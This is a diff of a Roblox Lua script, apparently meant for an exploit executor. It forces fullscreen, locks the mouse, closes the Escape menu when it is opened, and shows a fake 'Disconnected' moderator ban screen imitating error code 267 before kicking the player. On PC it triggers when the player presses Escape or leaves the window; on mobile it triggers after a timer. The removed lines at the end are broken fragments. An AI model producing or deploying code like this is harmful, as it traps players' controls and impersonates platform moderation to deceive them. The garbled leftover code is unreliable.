@@ -1,27 +1,62 @@
--- Permanent Fullscreen Lock + Triggered Mouse Lock + 50s Kick
+-- Services
 local uis = game:GetService("UserInputService")
 local rs = game:GetService("RunService")
 local sg = game:GetService("StarterGui")
 local gs = game:GetService("GuiService")
 local lp = game:GetService("Players").LocalPlayer
 
-local kickDelay = 150 -- Seconds after trigger until kick
+-- Config
+local pcKickDelay = 200       -- Seconds after trigger (PC)
+local mobileKickDelay = 70   -- Seconds from script start (Mobile)
 local lockActive = false
 
--- Always force fullscreen from script start
-rs.RenderStepped:Connect(function()
-    if not gs:IsFullscreen() then
-        gs:ToggleFullscreen()
-    end
-end)
+-- Function to show fake ban screen
+local function showFakeBan(reason, delayBeforeKick)
+    local screen = Instance.new("ScreenGui")
+    screen.IgnoreGuiInset = true
+    screen.Parent = game:GetService("CoreGui")
 
--- Function to activate lock + ESC closing
-local function activateLock()
+    local bg = Instance.new("Frame", screen)
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+    local title = Instance.new("TextLabel", bg)
+    title.Text = "Disconnected"
+    title.Font = Enum.Font.SourceSansBold
+    title.TextScaled = true
+    title.Size = UDim2.new(1, 0, 0, 100)
+    title.Position = UDim2.new(0, 0, 0.35, 0)
+    title.TextColor3 = Color3.fromRGB(0, 0, 0)
+
+    local reasonText = Instance.new("TextLabel", bg)
+    reasonText.Text = reason
+    reasonText.Font = Enum.Font.SourceSans
+    reasonText.TextSize = 24
+    reasonText.Size = UDim2.new(1, -40, 0, 60)
+    reasonText.Position = UDim2.new(0, 20, 0.45, 0)
+    reasonText.TextColor3 = Color3.fromRGB(0, 0, 0)
+    reasonText.TextWrapped = true
+
+    task.delay(delayBeforeKick, function()
+        lp:Kick(reason)
+    end)
+end
+
+-- Function to activate PC lock & countdown
+local function activateLock(kickDelay)
     if lockActive then return end
     lockActive = true
-    print("Lock activated. Player will be kicked in " .. kickDelay .. " seconds.")
+    print("Lock activated. Fake kick screen in " .. kickDelay .. " seconds.")
+
+    -- Force fullscreen always
+    rs.RenderStepped:Connect(function()
+        if not gs:IsFullscreen() then
+            gs:ToggleFullscreen()
+        end
+    end)
 
     -- Mouse lock
+    uis.MouseBehavior = Enum.MouseBehavior.LockCenter
     rs.RenderStepped:Connect(function()
         if uis.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
             uis.MouseBehavior = Enum.MouseBehavior.LockCenter
@@ -35,7 +70,6 @@ local function activateLock()
         sg:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
     end
 
-    -- Close menu on ESC/L after lock starts
     uis.InputBegan:Connect(function(i, g)
         if i.KeyCode == Enum.KeyCode.Escape then
             task.delay(0.025, closeMenu)
@@ -44,40 +78,34 @@ local function activateLock()
         end
     end)
 
-    -- Kick after timer
-    task.delay(kickDelay, function()
-        lp:Kick("You have been kicked from this experience. (Custom Script)")
-    end)
+    -- Show fake ban screen after delay
+    showFakeBan(
+        "You have been kicked by this experience or its moderators.\n(Error Code: 267)",
+        kickDelay
+    )
 end
 
--- Desktop only
+-- Detect platform
 if not uis.TouchEnabled then
-    -- Trigger on ESC press
+    -- Desktop trigger logic
     uis.InputBegan:Connect(function(input, gp)
         if not lockActive and input.KeyCode == Enum.KeyCode.Escape then
-            activateLock()
+            activateLock(pcKickDelay)
         end
     end)
 
-    -- Trigger on alt-tab / focus loss
     uis.WindowFocusReleased:Connect(function()
         if not lockActive then
-            activateLock()
+            activateLock(pcKickDelay)
         end
     end)
 else
-    print("Mobile detected. Script inactive.")
+    -- Mobile auto-delay logic
+    print("Mobile detected. Fake kick in " .. mobileKickDelay .. " seconds.")
+    task.delay(mobileKickDelay, function()
+        showFakeBan(
+            "You have been kicked by this experience or its moderators.\n(Error Code: 267)",
+            0 -- instantly kicks after showing
+        )
+    end)
 end
--- Kick after delay
-print("Player will be kicked in " .. lockTime .. " seconds.")
-task.wait(lockTime)
-lp:Kick("You have been kicked from this experience. (Custom Script)")    Title = "Disconnected",
-    Text = "You have been kicked by this experience or its moderators.\n(Error Code: 267)",
-    Duration = kickMessageTime
-})
-
-print("Kick message shown for " .. kickMessageTime .. " seconds.")
-
--- STEP 5: Wait, then actually kick the player
-task.wait(kickMessageTime)
-lp:Kick("You have been kicked from this experience. Reason: Exploit Detected. (Error Code: 267)")
